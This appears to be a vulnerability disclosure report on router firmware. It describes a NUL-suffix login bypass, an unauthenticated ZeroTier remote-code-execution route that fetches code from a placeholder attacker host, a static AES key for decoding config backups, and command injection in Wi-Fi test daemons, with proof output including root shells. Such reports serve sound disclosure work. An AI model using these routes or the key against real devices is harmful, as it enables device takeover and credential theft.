# Findings Summary

## At-A-Glance Risk

| ID | Severity | Finding | Affected Surface | Impact | PoC |
| --- | --- | --- | --- | --- | --- |
| F01 | Critical | ZeroTier auth-bypass RCE | Web management, `/goform/zerotier%00.js` | Unauthenticated root shell-command execution. Full device compromise. | [`pocs/poc_zerotier_unauth_rce.py`](../pocs/poc_zerotier_unauth_rce.py) |
| F02 | Critical | NUL-suffix web auth bypass | Web management router/auth layer | Bypasses login for protected handlers. Enables RCE, config theft, log theft, telnet enablement, ATE enablement, and protected API access. | [`pocs/poc_auth_bypass_telnet.py`](../pocs/poc_auth_bypass_telnet.py), [`pocs/poc_auth_bypass_ate.py`](../pocs/poc_auth_bypass_ate.py), [`pocs/poc_auth_bypass_getmodules.py`](../pocs/poc_auth_bypass_getmodules.py), [`pocs/poc_auth_bypass_setmodules.py`](../pocs/poc_auth_bypass_setmodules.py) |
| F03 | High | Config backup disclosure and static-key decode | Web management, `/cgi-bin/DownloadCfg%00.js` | Unauthenticated extraction of router secrets: Wi-Fi PSKs, password hashes, WireGuard private key, CWMP credentials, network/firewall config. | [`pocs/poc_auth_bypass_download_cfg.py`](../pocs/poc_auth_bypass_download_cfg.py), [`tools/decode_tenda_config_backup.sh`](../tools/decode_tenda_config_backup.sh) |
| F04 | High | Log archive disclosure | Web management, `/cgi-bin/DownloadLog%00.js` | Unauthenticated access to diagnostic and operational logs. | [`pocs/poc_auth_bypass_download_log.py`](../pocs/poc_auth_bypass_download_log.py) |
| F05 | High | WFA/Sigma command injection | rc.d-started WFA services, `wfa_dut:8000`, `wfa_ca:9000` | Command injection through Wi-Fi Alliance test command handlers; direct DUT TLV exploitation does not require `wfa_ca`. | [`pocs/poc_wfa_direct_dut_cmd_injection.py`](../pocs/poc_wfa_direct_dut_cmd_injection.py), [`pocs/poc_wfa_sta_get_mac_cmd_injection.py`](../pocs/poc_wfa_sta_get_mac_cmd_injection.py), [`pocs/poc_wfa_sta_get_ip_config_cmd_injection.py`](../pocs/poc_wfa_sta_get_ip_config_cmd_injection.py), [`pocs/poc_wfa_sta_set_ip_config_cmd_injection.py`](../pocs/poc_wfa_sta_set_ip_config_cmd_injection.py) |
| F06 | Medium | Session cookie and CSRF weaknesses | Web management session handling | Cookie lacks `HttpOnly`, `Secure`, and `SameSite`; selected authenticated state-changing GETs lack a meaningful referer requirement. | [`pocs/poc_cookie_missing_security_flags.py`](../pocs/poc_cookie_missing_security_flags.py), [`pocs/poc_csrf_missing_referer_ate.py`](../pocs/poc_csrf_missing_referer_ate.py) |

## F01: Critical ZeroTier Auth-Bypass RCE

Severity: Critical.

CVSS:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
```

The ZeroTier handler accepts an attacker-controlled URL, downloads
`zerotier.tar`, extracts it under `/var/zerotier`, and executes
`/var/zerotier/start_zerotier.sh`. The route is protected in the
password-configured state, but the NUL-suffix auth bypass reaches it without a
session.

Configured-state baseline:

```text
GET /goform/zerotier
-> 302 /login.html
```

Exploit route:

```text
GET /goform/zerotier%00.js?proto=http&url=<attacker-host>:<port>
```

Validation evidence:

```text
marker=ZEROTIER_POC_RCE
id=uid=0(root) gid=0(root) groups=0(root)
```

Reverse-shell validation:

```text
172.17.0.1:4444 ESTAB 172.17.0.3:49154
```

PoC:

```text
pocs/poc_zerotier_unauth_rce.py
```

Primary references:

```text
docs/AUTH_DEEP_DIVE.md
docs/POC_RESULTS.md
docs/WORKLOG.md
```

## F02: Critical NUL-Suffix Web Auth Bypass

Severity: Critical.

Protected routes can be reached without a valid session by appending a
percent-encoded NUL followed by a static-file extension:

```text
/<protected-route>%00.js
```

The auth gate classifies the URL as a static asset because it sees the `.js`
suffix, but later handler dispatch resolves the route as the NUL-truncated
protected path. In the password-configured state, plain routes redirect to
login while `%00.js` routes reach handlers.

Confirmed protected handlers reached without auth:

| Route | Plain No-Auth Result | Bypass Result | Impact | PoC |
| --- | --- | --- | --- | --- |
| `/goform/zerotier` | `302 /login.html` | root script execution | RCE | [`poc_zerotier_unauth_rce.py`](../pocs/poc_zerotier_unauth_rce.py) |
| `/cgi-bin/DownloadCfg` | `302 /login.html` | config backup | Secret disclosure | [`poc_auth_bypass_download_cfg.py`](../pocs/poc_auth_bypass_download_cfg.py) |
| `/cgi-bin/DownloadLog` | `302 /login.html` | log archive | Information disclosure | [`poc_auth_bypass_download_log.py`](../pocs/poc_auth_bypass_download_log.py) |
| `/goform/telnet` | `302 /login.html` | starts `telnetd` | Exposes login service on tcp/23 | [`poc_auth_bypass_telnet.py`](../pocs/poc_auth_bypass_telnet.py) |
| `/goform/ate` | `302 /login.html` | starts `td_ate` | Exposes manufacturing/test service | [`poc_auth_bypass_ate.py`](../pocs/poc_auth_bypass_ate.py) |
| `/goform/getModules` | auth-expired API response | protected read API reached | Data exposure surface | [`poc_auth_bypass_getmodules.py`](../pocs/poc_auth_bypass_getmodules.py) |
| `/goform/setModules` | auth-expired API response | protected write API reached | Configuration-write surface | [`poc_auth_bypass_setmodules.py`](../pocs/poc_auth_bypass_setmodules.py) |

Primary reference:

```text
docs/AUTH_DEEP_DIVE.md
```

## F03: High Config Backup Disclosure And Static-Key Decode

Severity: High.

The auth bypass downloads the protected router config backup without a session:

```text
GET /cgi-bin/DownloadCfg%00.js
-> 200 config/conf
```

The backup format uses a firmware-static AES-128-ECB key:

```text
AES-128-ECB(
  "<md5(config.tgz)>\n" +
  "<product-id>\n" +
  config.tgz
)
```

Static key:

```text
4008dfec3c0e98c406b50f8749924008
```

Validated decoded contents include:

```text
etc/config/wireless
etc/config/pub
etc/config/cwmp
etc/config/wireguard
etc/passwd
etc/shadow
```

Impact:

- Wi-Fi SSID and PSK recovery.
- Management password hash recovery.
- `/etc/shadow` hash recovery.
- WireGuard private key recovery.
- CWMP/TR-069 credential recovery.
- Network, firewall, and VPN configuration disclosure.

PoCs/tools:

```text
pocs/poc_auth_bypass_download_cfg.py
tools/decode_tenda_config_backup.sh
```

Primary reference:

```text
docs/CONFIG_BACKUP_DEEP_DIVE.md
```

## F04: High Log Archive Disclosure

Severity: High.

The auth bypass downloads protected log archives without a session:

```text
GET /cgi-bin/DownloadLog%00.js
-> 200 log archive
```

Impact:

- Operational and diagnostic information disclosure.
- Potential leakage of device state, identifiers, network events, and service
  behavior useful for follow-on attacks.

PoC:

```text
pocs/poc_auth_bypass_download_log.py
```

## F05: High WFA/Sigma Test Daemon Command Injection

Severity: High.

The firmware starts Wi-Fi Alliance/Sigma test daemons from rc.d. `wfa_dut`
listens on `8000/tcp`, and direct binary TLV frames to the stock-started DUT
listener can inject shell metacharacters into command handlers.

Confirmed:

```text
stock wfa_dut:8000 + crafted TLV -> /tmp/direct_8000 created
```

Impact:

- Unauthenticated command execution if `wfa_dut:8000` is reachable from an
  attacker-controlled network path.
- Wi-Fi configuration manipulation.
- Traffic generation abuse.
- Test command abuse from LAN/radio-lab side.

PoCs:

```text
pocs/poc_wfa_direct_dut_cmd_injection.py
pocs/poc_wfa_sta_get_mac_cmd_injection.py
pocs/poc_wfa_sta_get_ip_config_cmd_injection.py
pocs/poc_wfa_sta_set_ip_config_cmd_injection.py
```

Primary references:

```text
docs/FINDING_R07_WFA_DUT_UNAUTH_RCE.md
docs/R07_WFA_COMMAND_INJECTION_POC.md
```

## F06: Medium Session Cookie And CSRF Weaknesses

Severity: Medium.

The login cookie is emitted without common browser hardening attributes:

```text
Set-Cookie: password=...; path=/
```

Missing:

```text
HttpOnly
Secure
SameSite
```

An authenticated state-changing GET to `/goform/ate` also accepted a request
without a `Referer` and spawned the ATE service.

Impact:

- Raises session theft risk in browser-based attack paths.
- Raises authenticated state-change risk.
- Not required for the unauthenticated RCE chain.

PoCs:

```text
pocs/poc_cookie_missing_security_flags.py
pocs/poc_csrf_missing_referer_ate.py
```
